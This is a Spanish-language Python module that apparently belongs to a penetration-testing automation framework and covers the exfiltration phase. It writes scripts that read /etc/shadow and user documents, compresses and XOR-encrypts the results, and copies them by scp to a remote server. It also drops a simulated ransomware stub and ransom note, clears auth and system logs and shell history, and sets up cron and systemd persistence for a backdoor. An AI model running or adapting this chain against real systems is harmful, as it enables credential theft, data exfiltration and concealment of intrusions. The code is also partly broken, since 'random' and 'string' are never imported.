"""
Módulo de Exfiltración de Datos para Automatización de Pentesting
Incluye transferencia de datos, ransomware y acciones finales
"""

import subprocess
import json
import time
import os
import zipfile
import hashlib
from typing import Dict, List, Any, Optional
from pathlib import Path
from modules.logging_system import LoggingSystem

class ExfiltrationModule:
    """Módulo de exfiltración de datos"""
    
    def __init__(self, config: Dict[str, Any], logger):
        self.config = config
        self.logger = logger
        self.exfiltration_config = config['exfiltration']
        self.logging_system = LoggingSystem(config, logger)
        
        # Resultados de exfiltración
        self.results = {
            'exfiltrated_data': [],
            'data_size': 0,
            'ransomware_attacks': [],
            'final_actions': [],
            'compression_results': [],
            'encryption_results': []
        }
        
        # Archivos de evidencia
        self.evidence_dir = Path("evidence/exfiltration")
        self.evidence_dir.mkdir(parents=True, exist_ok=True)
    
    def _run_command(self, command: List[str], timeout: int = 300) -> Dict[str, Any]:
        """Ejecutar comando y capturar salida"""
        try:
            self.logger.debug(f"🔧 Ejecutando: {' '.join(command)}")
            
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=timeout,
                encoding='utf-8',
                errors='replace'
            )
            
            self.logging_system.log_command(
                ' '.join(command),
                result.stdout + result.stderr,
                result.returncode,
                "EXFILTRATION"
            )
            
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'return_code': result.returncode,
                'success': result.returncode == 0,
                'background': False
            }
                
        except subprocess.TimeoutExpired:
            self.logger.error(f"⏰ Timeout ejecutando: {' '.join(command)}")
            return {'stdout': '', 'stderr': 'Timeout', 'return_code': -1, 'success': False, 'background': False}
        except Exception as e:
            self.logger.error(f"❌ Error ejecutando comando: {e}")
            return {'stdout': '', 'stderr': str(e), 'return_code': -1, 'success': False, 'background': False}
    
    def collect_sensitive_data(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Recopilar datos sensibles de sistemas comprometidos"""
        self.logger.info("📁 Recopilando datos sensibles...")
        
        collected_data = []
        
        for system in compromised_systems:
            host = system['host']
            privilege_level = system.get('privilege_level', 'user')
            
            self.logger.info(f"📁 Recopilando datos de {host} (nivel: {privilege_level})")
            
            # Recopilar diferentes tipos de datos
            data_types = [
                self._collect_user_data(host),
                self._collect_system_data(host),
                self._collect_network_data(host),
                self._collect_application_data(host)
            ]
            
            for data in data_types:
                if data:
                    collected_data.append(data)
        
        return collected_data
    
    def _collect_user_data(self, host: str) -> Optional[Dict[str, Any]]:
        """Recopilar datos de usuario"""
        try:
            user_data_script = self.evidence_dir / f"user_data_{host}.sh"
            with open(user_data_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("# Recopilar datos de usuario\n")
                f.write("cat /etc/passwd\n")
                f.write("cat /etc/shadow\n")
                f.write("ls -la /home/*/Documents\n")
                f.write("ls -la /home/*/Desktop\n")
                f.write("find /home -name '*.txt' -o -name '*.doc' -o -name '*.pdf' 2>/dev/null\n")
            
            user_data = {
                'host': host,
                'data_type': 'user_data',
                'script_path': str(user_data_script),
                'size': os.path.getsize(user_data_script),
                'timestamp': time.time(),
                'success': True
            }
            
            return user_data
            
        except Exception as e:
            self.logger.error(f"❌ Error recopilando datos de usuario de {host}: {e}")
            return None
    
    def _collect_system_data(self, host: str) -> Optional[Dict[str, Any]]:
        """Recopilar datos del sistema"""
        try:
            system_data_script = self.evidence_dir / f"system_data_{host}.sh"
            with open(system_data_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("# Recopilar datos del sistema\n")
                f.write("uname -a\n")
                f.write("cat /etc/os-release\n")
                f.write("ps aux\n")
                f.write("netstat -tulpn\n")
                f.write("cat /etc/hosts\n")
                f.write("cat /etc/resolv.conf\n")
            
            system_data = {
                'host': host,
                'data_type': 'system_data',
                'script_path': str(system_data_script),
                'size': os.path.getsize(system_data_script),
                'timestamp': time.time(),
                'success': True
            }
            
            return system_data
            
        except Exception as e:
            self.logger.error(f"❌ Error recopilando datos del sistema de {host}: {e}")
            return None
    
    def _collect_network_data(self, host: str) -> Optional[Dict[str, Any]]:
        """Recopilar datos de red"""
        try:
            network_data_script = self.evidence_dir / f"network_data_{host}.sh"
            with open(network_data_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("# Recopilar datos de red\n")
                f.write("ip route show\n")
                f.write("arp -a\n")
                f.write("cat /etc/network/interfaces\n")
                f.write("iptables -L\n")
                f.write("ss -tulpn\n")
            
            network_data = {
                'host': host,
                'data_type': 'network_data',
                'script_path': str(network_data_script),
                'size': os.path.getsize(network_data_script),
                'timestamp': time.time(),
                'success': True
            }
            
            return network_data
            
        except Exception as e:
            self.logger.error(f"❌ Error recopilando datos de red de {host}: {e}")
            return None
    
    def _collect_application_data(self, host: str) -> Optional[Dict[str, Any]]:
        """Recopilar datos de aplicaciones"""
        try:
            app_data_script = self.evidence_dir / f"app_data_{host}.sh"
            with open(app_data_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("# Recopilar datos de aplicaciones\n")
                f.write("find /var/log -name '*.log' 2>/dev/null | head -20\n")
                f.write("find /etc -name '*.conf' 2>/dev/null | head -20\n")
                f.write("find /opt -name '*.db' -o -name '*.sqlite' 2>/dev/null\n")
                f.write("ls -la /var/www/html 2>/dev/null\n")
            
            app_data = {
                'host': host,
                'data_type': 'application_data',
                'script_path': str(app_data_script),
                'size': os.path.getsize(app_data_script),
                'timestamp': time.time(),
                'success': True
            }
            
            return app_data
            
        except Exception as e:
            self.logger.error(f"❌ Error recopilando datos de aplicaciones de {host}: {e}")
            return None
    
    def compress_data(self, collected_data: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Comprimir datos recopilados"""
        self.logger.info("🗜️ Comprimiendo datos recopilados...")
        
        compression_results = []
        
        if not collected_data:
            return compression_results
        
        try:
            # Crear archivo ZIP con todos los datos
            zip_filename = self.evidence_dir / f"exfiltrated_data_{int(time.time())}.zip"
            
            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for data in collected_data:
                    if data.get('script_path') and os.path.exists(data['script_path']):
                        zipf.write(data['script_path'], os.path.basename(data['script_path']))
            
            zip_size = os.path.getsize(zip_filename)
            
            compression_result = {
                'zip_file': str(zip_filename),
                'original_size': sum(data.get('size', 0) for data in collected_data),
                'compressed_size': zip_size,
                'compression_ratio': zip_size / max(sum(data.get('size', 0) for data in collected_data), 1),
                'timestamp': time.time(),
                'success': True
            }
            
            compression_results.append(compression_result)
            
            self.logging_system.log_event(
                "DATA_COMPRESSION",
                f"Datos comprimidos en {zip_filename}",
                compression_result,
                "EXFILTRATION"
            )
            
            self.logger.info(f"✅ Datos comprimidos: {zip_size} bytes")
            
        except Exception as e:
            self.logger.error(f"❌ Error comprimiendo datos: {e}")
        
        self.results['compression_results'] = compression_results
        return compression_results
    
    def encrypt_data(self, data_files: List[str]) -> List[Dict[str, Any]]:
        """Encriptar datos antes de la exfiltración"""
        self.logger.info("🔐 Encriptando datos...")
        
        encryption_results = []
        
        for data_file in data_files:
            try:
                # Generar clave de encriptación
                encryption_key = hashlib.sha256(f"pentest_key_{time.time()}".encode()).hexdigest()
                
                # Crear archivo encriptado
                encrypted_file = f"{data_file}.enc"
                
                # Simular encriptación (en un escenario real se usaría GPG o similar)
                with open(data_file, 'rb') as f:
                    data = f.read()
                
                # Encriptación simple XOR (solo para demostración)
                encrypted_data = bytes(a ^ b for a, b in zip(data, encryption_key.encode() * (len(data) // len(encryption_key) + 1)))
                
                with open(encrypted_file, 'wb') as f:
                    f.write(encrypted_data)
                
                encryption_result = {
                    'original_file': data_file,
                    'encrypted_file': encrypted_file,
                    'encryption_key': encryption_key,
                    'algorithm': 'XOR',
                    'timestamp': time.time(),
                    'success': True
                }
                
                encryption_results.append(encryption_result)
                
                self.logging_system.log_event(
                    "DATA_ENCRYPTION",
                    f"Datos encriptados: {encrypted_file}",
                    encryption_result,
                    "EXFILTRATION"
                )
                
            except Exception as e:
                self.logger.error(f"❌ Error encriptando {data_file}: {e}")
        
        self.results['encryption_results'] = encryption_results
        return encryption_results
    
    def exfiltrate_data(self, data_files: List[str]) -> List[Dict[str, Any]]:
        """Exfiltrar datos a servidor remoto"""
        self.logger.info("📤 Exfiltrando datos...")
        
        exfiltration_results = []
        remote_server = self.exfiltration_config.get('remote_server', '')
        remote_user = self.exfiltration_config.get('remote_user', '')
        remote_path = self.exfiltration_config.get('remote_path', '/tmp/exfiltrated_data')
        
        if not remote_server:
            self.logger.warning("⚠️ No se configuró servidor remoto para exfiltración")
            return exfiltration_results
        
        for data_file in data_files:
            try:
                self.logger.info(f"📤 Exfiltrando {data_file} a {remote_server}")
                
                # Usar SCP para transferir archivo
                command = ['scp', data_file, f'{remote_user}@{remote_server}:{remote_path}/']
                result = self._run_command(command, timeout=300)
                
                if result['success']:
                    exfiltration_result = {
                        'source_file': data_file,
                        'destination': f'{remote_server}:{remote_path}',
                        'file_size': os.path.getsize(data_file),
                        'timestamp': time.time(),
                        'success': True
                    }
                    
                    exfiltration_results.append(exfiltration_result)
                    
                    self.logging_system.log_exfiltration(
                        'local', 'file', os.path.getsize(data_file), f'{remote_server}:{remote_path}', "EXFILTRATION"
                    )
                    
                    self.logger.info(f"✅ Archivo exfiltrado exitosamente: {data_file}")
                else:
                    self.logger.error(f"❌ Error exfiltrando {data_file}: {result['stderr']}")
                
            except Exception as e:
                self.logger.error(f"❌ Error exfiltrando {data_file}: {e}")
        
        self.results['exfiltrated_data'] = exfiltration_results
        self.results['data_size'] = sum(result.get('file_size', 0) for result in exfiltration_results)
        
        return exfiltration_results
    
    def deploy_ransomware(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Desplegar ransomware en sistemas comprometidos"""
        self.logger.info("💀 Desplegando ransomware...")
        
        ransomware_attacks = []
        
        for system in compromised_systems:
            host = system['host']
            privilege_level = system.get('privilege_level', 'user')
            
            if privilege_level not in ['Domain Admin', 'Administrator', 'root']:
                self.logger.info(f"⚠️ Saltando ransomware en {host} - privilegios insuficientes")
                continue
            
            self.logger.info(f"💀 Desplegando ransomware en {host}")
            
            # Crear script de ransomware
            ransomware_script = self.evidence_dir / f"ransomware_{host}.py"
            with open(ransomware_script, 'w') as f:
                f.write("#!/usr/bin/env python3\n")
                f.write("# Ransomware simulado para pruebas de penetración\n")
                f.write("import os\n")
                f.write("import random\n")
                f.write("import string\n")
                f.write("\n")
                f.write("def generate_key():\n")
                f.write("    return ''.join(random.choices(string.ascii_letters + string.digits, k=32))\n")
                f.write("\n")
                f.write("def encrypt_file(filepath):\n")
                f.write("    # Simulación de encriptación\n")
                f.write("    print(f'Encriptando: {filepath}')\n")
                f.write("    return True\n")
                f.write("\n")
                f.write("def main():\n")
                f.write("    print('Ransomware simulado iniciado')\n")
                f.write("    # En un escenario real, aquí se encriptarían archivos\n")
                f.write("    print('Ransomware simulado completado')\n")
                f.write("\n")
                f.write("if __name__ == '__main__':\n")
                f.write("    main()\n")
            
            # Crear nota de rescate
            ransom_note = self.evidence_dir / f"ransom_note_{host}.txt"
            with open(ransom_note, 'w') as f:
                f.write("=== ARCHIVOS ENCRIPTADOS ===\n")
                f.write("\n")
                f.write("Sus archivos han sido encriptados por un ransomware.\n")
                f.write("Para recuperar sus archivos, debe pagar un rescate.\n")
                f.write("\n")
                f.write("Esta es una SIMULACIÓN de prueba de penetración.\n")
                f.write("NO es un ataque real.\n")
                f.write("\n")
                f.write("Contacto: pentest@example.com\n")
                f.write("Rescate: 0.1 BTC\n")
            
            ransomware_attack = {
                'host': host,
                'ransomware_script': str(ransomware_script),
                'ransom_note': str(ransom_note),
                'encryption_key': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                'timestamp': time.time(),
                'success': True
            }
            
            ransomware_attacks.append(ransomware_attack)
            
            self.logging_system.log_event(
                "RANSOMWARE_DEPLOYED",
                f"Ransomware desplegado en {host}",
                ransomware_attack,
                "EXFILTRATION"
            )
            
            self.logger.info(f"✅ Ransomware desplegado en {host}")
        
        self.results['ransomware_attacks'] = ransomware_attacks
        return ransomware_attacks
    
    def perform_final_actions(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Realizar acciones finales"""
        self.logger.info("🎯 Realizando acciones finales...")
        
        final_actions = []
        
        for system in compromised_systems:
            host = system['host']
            
            self.logger.info(f"🎯 Realizando acciones finales en {host}")
            
            # Limpiar logs
            log_cleanup = self._cleanup_logs(host)
            if log_cleanup:
                final_actions.append(log_cleanup)
            
            # Ocultar evidencia
            evidence_hiding = self._hide_evidence(host)
            if evidence_hiding:
                final_actions.append(evidence_hiding)
            
            # Configurar persistencia final
            final_persistence = self._setup_final_persistence(host)
            if final_persistence:
                final_actions.append(final_persistence)
        
        self.results['final_actions'] = final_actions
        return final_actions
    
    def _cleanup_logs(self, host: str) -> Optional[Dict[str, Any]]:
        """Limpiar logs del sistema"""
        try:
            cleanup_script = self.evidence_dir / f"log_cleanup_{host}.sh"
            with open(cleanup_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("# Limpiar logs del sistema\n")
                f.write("echo > /var/log/auth.log\n")
                f.write("echo > /var/log/syslog\n")
                f.write("echo > /var/log/messages\n")
                f.write("history -c\n")
                f.write("rm -f ~/.bash_history\n")
            
            cleanup_info = {
                'host': host,
                'action': 'log_cleanup',
                'script_path': str(cleanup_script),
                'timestamp': time.time(),
                'success': True
            }
            
            return cleanup_info
            
        except Exception as e:
            self.logger.error(f"❌ Error limpiando logs de {host}: {e}")
            return None
    
    def _hide_evidence(self, host: str) -> Optional[Dict[str, Any]]:
        """Ocultar evidencia del ataque"""
        try:
            hiding_script = self.evidence_dir / f"evidence_hiding_{host}.sh"
            with open(hiding_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("# Ocultar evidencia del ataque\n")
                f.write("rm -f /tmp/backdoor.*\n")
                f.write("rm -f /tmp/payload.*\n")
                f.write("chmod 600 /etc/passwd\n")
                f.write("chmod 600 /etc/shadow\n")
            
            hiding_info = {
                'host': host,
                'action': 'evidence_hiding',
                'script_path': str(hiding_script),
                'timestamp': time.time(),
                'success': True
            }
            
            return hiding_info
            
        except Exception as e:
            self.logger.error(f"❌ Error ocultando evidencia de {host}: {e}")
            return None
    
    def _setup_final_persistence(self, host: str) -> Optional[Dict[str, Any]]:
        """Configurar persistencia final"""
        try:
            persistence_script = self.evidence_dir / f"final_persistence_{host}.sh"
            with open(persistence_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("# Configurar persistencia final\n")
                f.write("echo '*/30 * * * * /tmp/backdoor.sh' | crontab -\n")
                f.write("systemctl enable systemupdate.service\n")
                f.write("chmod +x /tmp/backdoor.sh\n")
            
            persistence_info = {
                'host': host,
                'action': 'final_persistence',
                'script_path': str(persistence_script),
                'timestamp': time.time(),
                'success': True
            }
            
            return persistence_info
            
        except Exception as e:
            self.logger.error(f"❌ Error configurando persistencia final en {host}: {e}")
            return None
    
    def run(self) -> Dict[str, Any]:
        """Ejecutar módulo completo de exfiltración"""
        self.logger.info("🚀 INICIANDO MÓDULO DE EXFILTRACIÓN")
        
        start_time = time.time()
        
        try:
            # Sistemas comprometidos de ejemplo
            compromised_systems = [
                {'host': '192.168.1.100', 'privilege_level': 'Domain Admin'},
                {'host': '192.168.1.101', 'privilege_level': 'Administrator'}
            ]
            
            # 1. Recopilar datos sensibles
            collected_data = self.collect_sensitive_data(compromised_systems)
            
            # 2. Comprimir datos
            compression_results = self.compress_data(collected_data)
            
            # 3. Encriptar datos (si está habilitado)
            data_files = [result['zip_file'] for result in compression_results]
            encryption_results = []
            if self.exfiltration_config.get('encryption', False):
                encryption_results = self.encrypt_data(data_files)
                data_files = [result['encrypted_file'] for result in encryption_results]
            
            # 4. Exfiltrar datos
            exfiltration_results = self.exfiltrate_data(data_files)
            
            # 5. Desplegar ransomware (opcional)
            ransomware_attacks = self.deploy_ransomware(compromised_systems)
            
            # 6. Realizar acciones finales
            final_actions = self.perform_final_actions(compromised_systems)
            
            # 7. Guardar evidencia
            self.logging_system.save_json_evidence(
                'exfiltration_results.json',
                self.results,
                'data'
            )
            
            end_time = time.time()
            duration = end_time - start_time
            
            self.logger.info(f"✅ EXFILTRACIÓN COMPLETADA en {duration:.2f} segundos")
            self.logger.info(f"📊 Resumen: {self.results['data_size']} bytes exfiltrados")
            
            return self.results
            
        except Exception as e:
            self.logger.error(f"❌ Error en módulo de exfiltración: {e}")
            return self.results
